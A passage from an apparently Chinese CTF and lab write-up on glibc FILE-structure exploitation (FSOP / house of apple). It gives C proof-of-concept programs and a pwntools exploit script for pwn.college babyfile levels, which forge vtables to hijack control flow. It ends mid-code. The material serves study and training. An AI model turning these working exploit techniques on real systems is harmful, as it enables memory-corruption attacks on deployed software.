<span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.泄露libc基地址,泄露IO_wfile_jumps地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.构造fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.fopen打开的FILE对象,会自动挂到IO_list_all上,省去了我们泄露IO_list_all并修改其值的步骤</span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>);</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//修改vtable和wide_data.wide_vtable</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//fclose(fp);   如果fclose执行则fp会从IO_list_all中删除,因此不能执行</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.return and trigger win</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc fsop.c -o fsop -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./fsop</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7f218fb94110</span><br><span class="line">libc_addr = 0x7f218fb40000</span><br><span class="line">IO_wfile_jumps = 0x7f218fd15268</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>



<p>也可以通过修改<code>stdout-&gt;_chain</code>指向假<code>FILE</code>实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.通过沾stdout亲带故上链</span></span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_chain = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a><a target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/file-struct-exploits/">pwn.college</a></h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>篡改位于堆上的<code>FILE</code>结构,使其文件描述符<code>fileno</code>为1,也就是到标准输出</p>
<p>使其缓冲区位于泄露地址上</p>
<p>举一个例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> flag[]=<span class="string">&quot;flag&#123;secret&#125;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,flag);			<span class="comment">//泄露flag地址</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,fp,<span class="number">480</span>);</span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">0x100</span>,fp);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



















<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><code>level7</code>题目中给的提示是这样的:</p>
<blockquote>
<p> This can be done by creating a fake _wide_data struct which will not have a security check on the vtable. </p>
</blockquote>
<p>意思是篡改<code>_wide_data.vtable</code>指针不会被检查</p>
<p>在一个<code>FILE</code>结构体中,理论上有两个<code>vtable</code>指针,一个<code>_IO_FILE_plus + 0xd8</code>处的<code>vtable</code>指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x00d8 */</span>    FILE file;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  224 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>还有一个在<code>_IO_FILE._wide_data._wide_vtable</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE + 0xa0    =&gt;  _wide_data</span><br><span class="line">_wide_data + 0xe0  =&gt;  _wide_vtable</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0070 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0038 */</span>        _IO_iconv_t __cd_in;</span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0038 */</span>        _IO_iconv_t __cd_out;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):  112 */</span></span><br><span class="line">                               &#125; _codecvt;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0004 */</span>    <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x00e0      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  232 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>



<p>既然<code>_IO_FILE</code>本身就自带一个<code>vtable</code>,那么<code>level7</code>为何还要多此一举去改<code>_IO_FILE._wide_data._wide_vtable</code>?</p>
<p>因为<code>pwncollege</code>提供的靶场环境中使用的<code>libc</code>版本是<code>Ubuntu GLIBC 2.31-0ubuntu9.16</code></p>
<p>在<code>Glibc 2.23</code>之前是可以直接修改<code>_IO_FILE.vtable</code>指针的, 相关攻击方式被称为<code>house of orange</code>,</p>
<p>此攻击可以在<code>how2heap</code>靶场学习,<code>ubuntu16.04</code>有<code>Glibc2.23</code>环境</p>
<p>但<code>Glibc 2.24</code>之后就加入了对<code>_IO_FILE.vtable</code>指针的范围检查,只能在<code>glibc</code>内存区中的某个特定位置,不允许指向堆区或者栈区</p>
<p>但是<code>_IO_FILE._wide_data._wide_vtable</code>还是没有检查的,相关攻击方式被称为<code>house of apple</code></p>
<p>吃完<code>apple</code>回来,可以做level7题了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *          </span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level7&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&quot;/challenge/babyfile_level7&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"><span class="comment">#获取win函数地址,泄露puts地址,泄露libc基地址,泄露_IO_wfile_jumps地址</span></span><br><span class="line">win_addr = <span class="number">0x4012E6</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The name buffer is located at: &#x27;</span>)</span><br><span class="line">name_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">name_addr = <span class="built_in">int</span>(name_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_addr = &quot;</span>,<span class="built_in">hex</span>(name_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">vtable_addr = libc_addr + libc.dump(<span class="string">&quot;_IO_file_jumps&quot;</span>)</span><br><span class="line">wide_vtable_addr =libc_addr + libc.dump(<span class="string">&quot;_IO_wfile_jumps&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc @ %p&quot;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vtable = &quot;</span>,<span class="built_in">hex</span>(vtable_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;wide_vtable = &quot;</span>,<span class="built_in">hex</span>(wide_vtable_addr))    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1&amp;2 </span></span><br><span class="line"><span class="comment">#构造fake_wide_data和fake_wide_vtable,</span></span><br><span class="line"><span class="comment">#由于只有一个可用堆块,哥俩得穿一条裤子</span></span><br><span class="line">fake_wide_data_addr = name_addr</span><br><span class="line">fake_wide_vtable_addr = name_addr + <span class="number">0x80</span></span><br><span class="line">fake_wide_data  =p64(<span class="number">0</span>) * <span class="number">28</span></span><br><span class="line">fake_wide_data += p64(fake_wide_vtable_addr)<span class="comment">#     const struct _IO_jump_t *_wide_vtable;</span></span><br><span class="line">fake_wide_data += p64(win_addr)</span><br><span class="line">p.send(fake_wide_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#设置FILE.flag</span></span><br><span class="line">fp = FileStructure()</span><br><span class="line">fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>)</span><br><span class="line"><span class="comment">#不能有_IO_CURRENTLY_PUTTING</span></span><br><span class="line"><span class="comment">#可写,不能有_IO_NO_WRITES</span></span><br><span class="line"><span class="comment">#不能有_IO_UNBUFFERED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4&amp;5</span></span><br><span class="line"><span class="comment">#修改FILE.vtable指向_IO_wfile_jumps,</span></span><br><span class="line"><span class="comment">#修改FILE._wide_data指向fake_wide_data</span></span><br><span class="line"><span class="comment">#这里设置的flags是保证能进入某些分支</span></span><br><span class="line">fp.vtable = wide_vtable_addr</span><br><span class="line">fp._wide_data = name_addr</span><br><span class="line">payload = <span class="built_in">bytes</span>(fp)</span><br><span class="line"><span class="built_in">print</span>(fp)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><code>level9</code>中有一个函数<code>authenticated</code>可以<code>ret2text</code></p>
<p><code>level9</code>首先泄露的<code>puts</code>的地址</p>
<p><code>level9</code>给的利用点就是可以往<code>_IO_2_1_stdout_</code>结构体写入最多<code>0x1e0</code>个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0,stdout,0x1e0)</span><br></pre></td></tr></table></figure>

<p>最初的想法是直接修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stdout -&gt; vtable = _IO_wfile_jumps</span><br><span class="line">stdout -&gt; _wide_data -&gt; _wide_vtable -&gt; _IO_wfile_doallocate = authenticated </span><br></pre></td></tr></table></figure>

<p>这样在下次<code>puts</code>或者<code>printf</code>时就可以触发<code>authenticated</code>函数</p>
<p>然而很不幸</p>
<p><code>authenticated</code>中在使用<code>write(1,flag_buffer,flag_length)</code>打印flag之前,还有一个<code>puts(&quot;You win! Here is your flag:&quot;);</code>这会导致什么呢?</p>
<p>puts调用authenticated</p>
<p>authenticated调用puts</p>
<p>puts调用authenticated</p>
<p>authenticated调用puts</p>
<p>…</p>
<p>发生了递归调用的悲剧, 最终程序会因为爆栈内存导致段错误</p>
<p>原因是<code>puts</code>默认使用的就是<code>stdout</code>,而我们改的也正是<code>stdout</code></p>
<blockquote>
<p>可以通过这个poc调试观察这个悲剧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span 